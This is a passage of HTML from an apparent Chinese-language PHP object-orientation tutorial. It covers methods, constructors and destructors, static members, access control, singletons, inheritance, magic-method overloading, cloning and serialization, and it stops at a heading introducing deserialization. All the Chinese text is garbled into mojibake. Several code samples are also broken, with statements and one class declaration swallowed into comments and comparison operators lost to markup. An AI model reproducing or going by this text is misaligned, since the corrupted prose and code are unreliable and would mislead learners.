language_">$this</span>-&gt;price; <span class="comment">//å†…éƒ¨è®¿é—®ç§æœ‰å±æ€§    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¸‰-ç±»çš„æ–¹æ³•"><a class="markdownIt-Anchor" href="#ä¸‰-ç±»çš„æ–¹æ³•"></a> ä¸‰ã€ç±»çš„æ–¹æ³•</h3>
<p>æ–¹æ³•å°±æ˜¯åœ¨ç±»ä¸­çš„functionï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬åˆ†ä¸æ¸…æ–¹æ³•ä¸å‡½æ•°æœ‰ä»€ä¹ˆå·®åˆ«ï¼Œåœ¨é¢å‘è¿‡ç¨‹çš„ç¨‹åºè®¾è®¡ä¸­functionå«åšå‡½æ•°ï¼Œåœ¨é¢å‘å¯¹è±¡ä¸­functionåˆ™è¢«ç§°ä¹‹ä¸ºæ–¹æ³•ã€‚</p>
<p>åŒå±æ€§ä¸€æ ·ï¼Œç±»çš„æ–¹æ³•ä¹Ÿå…·æœ‰publicï¼Œprotected ä»¥åŠ private çš„è®¿é—®æ§åˆ¶ã€‚</p>
<p>è®¿é—®æ§åˆ¶çš„å…³é”®å­—ä»£è¡¨çš„æ„ä¹‰ä¸ºï¼š<br>
publicï¼šå…¬å¼€çš„<br>
protectedï¼šå—ä¿æŠ¤çš„<br>
privateï¼šç§æœ‰çš„</p>
<p>å¯ä»¥è¿™æ ·å®šä¹‰æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;æ±½è½¦&#x27;</span>;    &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨å…³é”®å­—<span class="built_in">static</span>ä¿®é¥°çš„ï¼Œç§°ä¹‹ä¸ºé™æ€æ–¹æ³•ï¼Œé™æ€æ–¹æ³•ä¸éœ€è¦å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡ç±»åç›´æ¥è°ƒç”¨ï¼Œæ“ä½œç¬¦ä¸ºåŒå†’å·::ã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;æ±½è½¦&#x27;</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getName</span>(); <span class="comment">//ç»“æœä¸ºâ€œæ±½è½¦â€</span></span><br></pre></td></tr></table></figure>
<h3 id="å››-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"><a class="markdownIt-Anchor" href="#å››-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"></a> å››ã€æ„é€ å‡½æ•°å’Œææ„å‡½æ•°</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP5å¯ä»¥åœ¨ç±»ä¸­ä½¿ç”¨<span class="title function_ invoke__">__construct</span>()å®šä¹‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå…·æœ‰æ„é€ å‡½æ•°çš„ç±»ï¼Œä¼šåœ¨æ¯æ¬¡å¯¹è±¡åˆ›å»ºçš„æ—¶å€™è°ƒç”¨è¯¥å‡½æ•°ï¼Œå› æ­¤å¸¸ç”¨æ¥åœ¨å¯¹è±¡åˆ›å»ºçš„æ—¶å€™è¿›è¡Œä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;æ„é€ å‡½æ•°è¢«è°ƒç”¨\n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ä¾‹åŒ–çš„æ—¶å€™ ä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•°__constructï¼Œè¿™é‡Œä¼šè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">åœ¨å­ç±»ä¸­å¦‚æœå®šä¹‰äº†__constructåˆ™ä¸ä¼šè°ƒç”¨çˆ¶ç±»çš„__constructï¼Œå¦‚æœéœ€è¦åŒæ—¶è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œéœ€è¦ä½¿ç”¨<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>()æ˜¾å¼çš„è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;çˆ¶ç±»æ„é€ å‡½æ•°è¢«è°ƒç”¨\n&quot;</span>;   &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">Truck</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;å­ç±»æ„é€ å‡½æ•°è¢«è°ƒç”¨\n&quot;</span>;       <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Truck</span>();</span><br><span class="line"></span><br><span class="line">åŒæ ·ï¼ŒPHP5æ”¯æŒææ„å‡½æ•°ï¼Œä½¿ç”¨<span class="title function_ invoke__">__destruct</span>()è¿›è¡Œå®šä¹‰ï¼Œææ„å‡½æ•°æŒ‡çš„æ˜¯å½“æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤ï¼Œæˆ–è€…å¯¹è±¡è¢«æ˜¾å¼çš„é”€æ¯æ—¶ä¼šæ‰§è¡Œçš„å‡½æ•°ã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;æ„é€ å‡½æ•°è¢«è°ƒç”¨ \n&quot;</span>;   &#125;   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;ææ„å‡½æ•°è¢«è°ƒç”¨ \n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//å®ä¾‹åŒ–æ—¶ä¼šè°ƒç”¨æ„é€ å‡½æ•°echo &#x27;ä½¿ç”¨åï¼Œå‡†å¤‡é”€æ¯carå¯¹è±¡ \n&#x27;;unset($car); //é”€æ¯æ—¶ä¼šè°ƒç”¨ææ„å‡½æ•°</span></span><br></pre></td></tr></table></figure>
<p>å½“PHPä»£ç æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œä¼šè‡ªåŠ¨å›æ”¶ä¸é”€æ¯å¯¹è±¡ï¼Œå› æ­¤ä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦æ˜¾å¼çš„å»é”€æ¯å¯¹è±¡ã€‚</p>
<h3 id="äº”-staticé™æ€å…³é”®å­—"><a class="markdownIt-Anchor" href="#äº”-staticé™æ€å…³é”®å­—"></a> äº”ã€Staticé™æ€å…³é”®å­—</h3>
<p>é™æ€å±æ€§ä¸æ–¹æ³•å¯ä»¥åœ¨ä¸å®ä¾‹åŒ–ç±»çš„æƒ…å†µä¸‹è°ƒç”¨ï¼Œç›´æ¥ä½¿ç”¨ç±»å::æ–¹æ³•åçš„æ–¹å¼è¿›è¡Œè°ƒç”¨ã€‚é™æ€å±æ€§ä¸å…è®¸å¯¹è±¡ä½¿ç”¨-&gt;æ“ä½œç¬¦è°ƒç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getSpeed</span>();  <span class="comment">//è°ƒç”¨é™æ€æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">é™æ€æ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡å˜é‡æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;getSpeed&#x27;</span>;<span class="variable">$className</span> = <span class="string">&#x27;Car&#x27;</span>;<span class="keyword">echo</span> <span class="variable">$className</span>::<span class="variable">$func</span>();  <span class="comment">//åŠ¨æ€è°ƒç”¨é™æ€æ–¹æ³•</span></span><br></pre></td></tr></table></figure>
<p>é™æ€æ–¹æ³•ä¸­ï¼Œ$thisä¼ªå˜é‡ä¸å…è®¸ä½¿ç”¨ã€‚å¯ä»¥ä½¿ç”¨selfï¼Œparentï¼Œstaticåœ¨å†…éƒ¨è°ƒç”¨é™æ€æ–¹æ³•ä¸å±æ€§ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;</span><br><span class="line"></span><br><span class="line">    &#125;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>+=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="class"><span class="keyword">class</span> <span class="title">BigCar</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">BigCar</span>::<span class="title function_ invoke__">start</span>();<span class="keyword">echo</span> <span class="title class_">BigCar</span>::<span class="title function_ invoke__">getSpeed</span>();</span><br></pre></td></tr></table></figure>
<h3 id="å…­-è®¿é—®æ§åˆ¶"><a class="markdownIt-Anchor" href="#å…­-è®¿é—®æ§åˆ¶"></a> å…­ã€è®¿é—®æ§åˆ¶</h3>
<p>è®¿é—®æ§åˆ¶é€šè¿‡å…³é”®å­—publicï¼Œprotectedå’Œprivateæ¥å®ç°ã€‚è¢«å®šä¹‰ä¸ºå…¬æœ‰çš„ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ã€‚è¢«å®šä¹‰ä¸ºå—ä¿æŠ¤çš„ç±»æˆå‘˜åˆ™å¯ä»¥è¢«å…¶è‡ªèº«ä»¥åŠå…¶å­ç±»å’Œçˆ¶ç±»è®¿é—®ã€‚è¢«å®šä¹‰ä¸ºç§æœ‰çš„ç±»æˆå‘˜åˆ™åªèƒ½è¢«å…¶å®šä¹‰æ‰€åœ¨çš„ç±»è®¿é—®ã€‚</p>
<p>ç±»å±æ€§å¿…é¡»å®šä¹‰ä¸ºå…¬æœ‰ã€å—ä¿æŠ¤ã€ç§æœ‰ä¹‹ä¸€ã€‚ä¸ºå…¼å®¹PHP5ä»¥å‰çš„ç‰ˆæœ¬ï¼Œå¦‚æœé‡‡ç”¨ var å®šä¹‰ï¼Œåˆ™è¢«è§†ä¸ºå…¬æœ‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$speed</span> = <span class="number">10</span>; <span class="comment">//é”™è¯¯ å±æ€§å¿…é¡»å®šä¹‰è®¿é—®æ§åˆ¶</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span>;   <span class="comment">//å®šä¹‰å…±æœ‰å±æ€§&#125;</span></span><br><span class="line"></span><br><span class="line">ç±»ä¸­çš„æ–¹æ³•å¯ä»¥è¢«å®šä¹‰ä¸ºå…¬æœ‰ã€ç§æœ‰æˆ–å—ä¿æŠ¤ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¿™äº›å…³é”®å­—ï¼Œåˆ™è¯¥æ–¹æ³•é»˜è®¤ä¸ºå…¬æœ‰</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//é»˜è®¤ä¸ºå…±æœ‰æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">turnLeft</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å¦‚æœæ„é€ å‡½æ•°å®šä¹‰æˆäº†ç§æœ‰æ–¹æ³•ï¼Œåˆ™ä¸å…è®¸ç›´æ¥å®ä¾‹åŒ–å¯¹è±¡äº†ï¼Œè¿™æ—¶å€™ä¸€èˆ¬é€šè¿‡é™æ€æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–ï¼Œåœ¨è®¾è®¡æ¨¡å¼ä¸­ä¼šç»å¸¸ä½¿ç”¨è¿™æ ·çš„æ–¹æ³•æ¥æ§åˆ¶å¯¹è±¡çš„åˆ›å»ºï¼Œæ¯”å¦‚å•ä¾‹æ¨¡å¼åªå…è®¸æœ‰ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„å¯¹è±¡ã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;object create&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$_object</span> = <span class="literal">null</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="built_in">self</span>::<span class="variable">$_object</span>)) &#123;            <span class="built_in">self</span>::<span class="variable">$_object</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//å†…éƒ¨æ–¹æ³•å¯ä»¥è°ƒç”¨ç§æœ‰æ–¹æ³•ï¼Œå› æ­¤è¿™é‡Œå¯ä»¥åˆ›å»ºå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_object</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//$car = new Car(); //è¿™é‡Œä¸å…è®¸ç›´æ¥å®ä¾‹åŒ–å¯¹è±¡$car = Car::getInstance(); //é€šè¿‡é™æ€æ–¹æ³•æ¥è·å¾—ä¸€ä¸ªå®ä¾‹</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¸ƒ-å¯¹è±¡ç»§æ‰¿"><a class="markdownIt-Anchor" href="#ä¸ƒ-å¯¹è±¡ç»§æ‰¿"></a> ä¸ƒã€å¯¹è±¡ç»§æ‰¿</h3>
<p>ç»§æ‰¿æ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­å¸¸ç”¨çš„ä¸€ä¸ªç‰¹æ€§ï¼Œæ±½è½¦æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç±»ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºåŸºç±»ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ±½è½¦è¿˜åˆ†ä¸ºå¡è½¦ã€è½¿è½¦ã€ä¸œé£ã€å®é©¬ç­‰ï¼Œå› ä¸ºè¿™äº›å­ç±»å…·æœ‰å¾ˆå¤šç›¸åŒçš„å±æ€§å’Œæ–¹æ³•ï¼Œå¯ä»¥é‡‡ç”¨ç»§æ‰¿æ±½è½¦ç±»æ¥å…±äº«è¿™äº›å±æ€§ä¸æ–¹æ³•ï¼Œå®ç°ä»£ç çš„å¤ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>; <span class="comment">//æ±½è½¦çš„èµ·å§‹é€Ÿåº¦æ˜¯0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;speed;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//å®šä¹‰ç»§æ‰¿äºCarçš„Truckç±»class Truck extends Car&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed = <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>() + <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å…«-é‡è½½"><a class="markdownIt-Anchor" href="#å…«-é‡è½½"></a> å…«ã€é‡è½½</h3>
<p>PHPä¸­çš„é‡è½½æŒ‡çš„æ˜¯åŠ¨æ€çš„åˆ›å»ºå±æ€§ä¸æ–¹æ³•ï¼Œæ˜¯é€šè¿‡é­”æœ¯æ–¹æ³•æ¥å®ç°çš„ã€‚å±æ€§çš„é‡è½½é€šè¿‡__setï¼Œ__getï¼Œ__issetï¼Œ__unsetæ¥åˆ†åˆ«å®ç°å¯¹ä¸å­˜åœ¨å±æ€§çš„èµ‹å€¼ã€è¯»å–ã€åˆ¤æ–­å±æ€§æ˜¯å¦è®¾ç½®ã€é”€æ¯å±æ€§ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="variable">$ary</span> = <span class="keyword">array</span>();    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>];</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;name = <span class="string">&#x27;æ±½è½¦&#x27;</span>;  <span class="comment">//nameå±æ€§åŠ¨æ€åˆ›å»ºå¹¶èµ‹å€¼echo $car-&gt;name;</span></span><br><span class="line"></span><br><span class="line">æ–¹æ³•çš„é‡è½½é€šè¿‡__callæ¥å®ç°ï¼Œå½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™ï¼Œå°†ä¼šè½¬ä¸ºå‚æ•°è°ƒç”¨__callæ–¹æ³•ï¼Œå½“è°ƒç”¨ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ—¶ä¼šä½¿ç”¨__callStaticé‡è½½ã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;speedUp&#x27;</span>) &#123;            <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;<span class="title function_ invoke__">speedUp</span>(); <span class="comment">//è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šä½¿ç”¨é‡è½½echo $car-&gt;speed;</span></span><br></pre></td></tr></table></figure>
<h3 id="å-å¯¹è±¡æ¯”è¾ƒ"><a class="markdownIt-Anchor" href="#å-å¯¹è±¡æ¯”è¾ƒ"></a> åã€å¯¹è±¡æ¯”è¾ƒ</h3>
<p>ï¼Œå½“åŒä¸€ä¸ªç±»çš„ä¸¤ä¸ªå®ä¾‹çš„æ‰€æœ‰å±æ€§éƒ½ç›¸ç­‰æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦<mark>è¿›è¡Œåˆ¤æ–­ï¼Œå½“éœ€è¦åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ˜¯å¦ä¸ºåŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å…¨ç­‰è¿ç®—ç¬¦</mark>=è¿›è¡Œåˆ¤æ–­ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="variable">$b</span>) <span class="keyword">echo</span> <span class="string">&#x27;==&#x27;</span>;   <span class="comment">//trueif ($a === $b) echo &#x27;===&#x27;; //false</span></span><br><span class="line"></span><br><span class="line">å¯¹è±¡å¤åˆ¶ï¼Œåœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡å…³é”®å­—<span class="keyword">clone</span>æ¥å¤åˆ¶ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ—¶__cloneæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œé€šè¿‡è¿™ä¸ªé­”æœ¯æ–¹æ³•æ¥è®¾ç½®å±æ€§çš„å€¼ã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();        <span class="variable">$obj</span>-&gt;name = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$a</span>-&gt;name = <span class="string">&#x27;new car&#x27;</span>;<span class="variable">$b</span> = <span class="keyword">clone</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">å¯¹è±¡åºåˆ—åŒ–ï¼Œå¯ä»¥é€šè¿‡serializeæ–¹æ³•å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨æˆ–è€…ä¼ é€’æ•°æ®ï¼Œç„¶ååœ¨éœ€è¦çš„æ—¶å€™é€šè¿‡unserializeå°†å­—ç¬¦ä¸²ååºåˆ—åŒ–æˆå¯¹è±¡è¿›è¡Œä½¿ç”¨</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="comment">//å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²echo $str.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;;$b = unserialize($str); //ååºåˆ—åŒ–ä¸ºå¯¹è±¡var_dump($b);</span></span><br></pre></td></tr></table></figure>
<h2 id="ååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#ååºåˆ—åŒ–"></a> ååºåˆ—åŒ–</h2>
<h3 id="ä¸€-åŸºæœ¬çŸ¥è¯†"><a class="markdownIt-Anchor" href="#ä¸€-åŸºæœ¬çŸ¥è¯†"></a> ä¸€ã€åŸºæœ¬çŸ¥è¯†</h3>
<h4 id="~ç±»å’Œå¯¹è±¡"><a class="markdownIt-Anchor" href="#~ç±»å’Œå¯¹è±¡"></a> ~ç±»å’Œå¯¹è±¡</h4>
